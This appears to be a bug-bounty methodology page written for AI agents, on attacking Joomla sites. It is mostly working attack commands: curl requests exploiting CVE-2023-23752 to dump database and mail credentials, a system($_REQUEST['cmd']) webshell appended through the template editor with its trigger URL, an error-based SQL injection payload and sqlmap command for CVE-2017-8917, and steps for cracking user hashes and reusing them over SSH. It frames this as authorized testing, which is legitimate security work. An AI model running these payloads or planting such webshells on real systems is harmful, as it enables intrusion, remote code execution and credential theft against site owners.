---
technology: Joomla
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "3 evidence files (see ../internal coverage ledger) — thin unit, upstream-heavy by design"
provenance: "field-mined from 3 engagements in the vault's evidence pool + upstream-verified 2026-11-12: developer.joomla.org security centre [20230201] (CVE-2023-23752: versions 4.0.0-4.2.7, improper access check in webservice endpoints, fixed 4.2.8), NVD CVE-2023-23752, Exploit-DB 42033 + Sucuri/Qualys analyses CVE-2017-8917 (com_fields list[fullordering] SQLi, Joomla 3.7.0 only), OWASP joomscan GitHub repo (perl scanner), docs.joomla.org 'How to check the Joomla version'. Honesty note: ZERO joomscan and ZERO com_fields exploitation in the evidence — both are upstream-provenance sections, flagged as such."
---

Companion page: [[joomla|Joomla overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Joomla Bug Bounty Methodology

**Scope:** Joomla core — fingerprinting and version oracles, unauthenticated information-disclosure routes to admin, administrator-to-RCE (template editor), and the credential loot chain (`configuration.php`, `#_users`). **Out of scope:** generic PHP misconfigurations (php-fpm unit), the MySQL server behind it (mysql unit), third-party extension auditing beyond the com_fields history note.

**Authorization:** presume written permission. The CVE-2023-23752 dump is a read — safe; template edits modify site files — restore the file content after proof and note the exact change in the report.

## Decision tree (one screen)

1. Generator meta / robots disallow set confirms Joomla → Phase 1 (version).
2. Version in 4.0.0–4.2.7 → Phase 2 (CVE-2023-23752 config dump) → creds → Phase 3.
3. Version 3.7.0 exactly → Phase 5 (com_fields SQLi history) → hashes → Phase 3.
4. Any admin credential (dump, reuse, crack) → Phase 3 (template editor RCE).
5. Shell or DB access → Phase 4 (configuration.php + #_users loot).

## Phase 1 — Fingerprinting and version oracles

```bash
curl -s http://example.com/ | grep -i 'name="generator"'   # <meta name="generator" content="Joomla! - Open Source CMS">
curl -s http://example.com/robots.txt                       # Disallow: /administrator/ /components/ /modules/ /templates/ /api/ ...
curl -s http://example.com/administrator/manifests/files/joomla.xml | grep -i version
```

The robots disallow block doubles as a directory map for fuzzing (observed: a 16-entry disallow list from nmap). Version sources in reliability order: `/administrator/manifests/files/joomla.xml` `<version>` (observed — the standard 4.x oracle); root `README.txt` (ships with the version header, deleted on hardened sites — its 404 pushes you to the manifest, and its presence dates an unhardened install); language manifests (`language/en-GB/en-GB.xml` and `administrator/language/...` carry `<version>`, the documented fallback for older branches). Note subdirectory installs (`/joomla/`) — prefix every path.

## Phase 2 — CVE-2023-23752: unauthenticated configuration dump (4.0.0–4.2.7)

Gate (verified advisory): **4.0.0 through 4.2.7**, fixed **4.2.8**. The webservice endpoints skip the access check when `public=true`:

```bash
curl http://example.com/api/index.php/v1/config/application?public=true -v
# response JSON: dbtype, host, user, password, mailfrom/smtp creds, sitename...
```

Observed runs: dump → `lewis:«password»` → `/administrator` login as Super User; the same CVE on a Windows-hosted install (dump fed a wider chain). The database password is a direct mysql-unit pivot even when it fails at `/administrator` ( privileges differ).

## Phase 3 — Administrator → template editor RCE

1. Log in at `/administrator` (Phase 2 creds, cracked hashes, or reuse).
2. `System → Site Templates → <template> Details and Files` (observed templates: Cassiopeia on 4.x, Protostar on 3.x).
3. Open a PHP file that renders on a public route — `error.php` (error pages) or `index.php` — append a minimal webshell; keep the original code intact.

```text
e.g. append to error.php:  forms of system($_REQUEST['cmd'])
trigger:  curl "http://example.com/templates/cassiopeia/error.php/error?cmd=id"   (observed shape)
```

4. Post-shell: read `configuration.php` (web root) for `$user/$password/$db` → MySQL pivot; loot `$log_path`/`$tmp_path` for path context. (Observed: the shell landed beside configuration.php and read it directly.)

## Phase 4 — Credential loot chain

- **`configuration.php`** — the DB credential set (and mail creds); identical role to WordPress's `wp-config.php` (see the wordpress unit).
- **`#_users` table** (post-DB): bcrypt `$2y$...` hashes → john/hashcat rockyou runs → reuse on SSH/host accounts (observed: the logan hash → cracked → SSH).
- **Super User list** — the administrator dashboard names accounts (observed: lewis Super User vs logan regular); target the superuser for template access.

## Phase 5 — 3.x-era history [upstream, not field]

- **CVE-2017-8917 — com_fields SQLi.** Gate (verified Exploit-DB/Sucuri/Qualys): **Joomla 3.7.0 exactly** (the `com_fields` component's public `list[fullordering]` parameter lacked filtering; fixed 3.7.1). Unauthenticated, error-based via `updatexml`/`extractvalue`:

```text
http://example.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(null,concat(0x3a,database()),null)--
sqlmap -u "http://example.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 -p list[fullordering] --dbs
```

- **joomscan (OWASP)** — perl vulnerability scanner for Joomla misconfig/known-CVE sweeps; zero observed invocations (the observed chains enumerated manually per Phase 1), so its output should be treated as a lead list to re-verify by hand — same version-spoof caution as the wordpress unit's wpscan lessons.

## Disclosure notes

- Version-gate every claim: "4.2.6 ⇒ CVE-2023-23752 applies (4.0.0–4.2.7)" — quote the manifest response as evidence; a 3.7.1+ site is out of the com_fields window entirely.
- The config dump exposes credentials without any file write — rate it critical-with-proof (working login or DB connect), informational otherwise.
- Template edits: restore file contents, record before/after hashes; report the admin-credential path separately from the RCE it enabled.

## Appendix A — Tool mapping (prose)

- **curl** — generator/robots/manifest fingerprinting, the CVE-2023-23752 dump, webshell triggers.
- **nmap** (`-sC -sV`) — http-generator and http-robots script output fingerprint Joomla before any page visit.
- **sqlmap** — com_fields `list[fullordering]` injection on 3.7.0-era sites (upstream workflow).
- **joomscan** (OWASP, perl) — historical scanner; verify its findings manually (upstream-only, zero observed use).
- **john / hashcat** — bcrypt `$2y$` user hashes from `#_users`.
- **searchsploit** — Joomla core/extension exploit cross-check keyed on the exact version.
- **mysql client** — post-`configuration.php` database pivot (mysql unit).
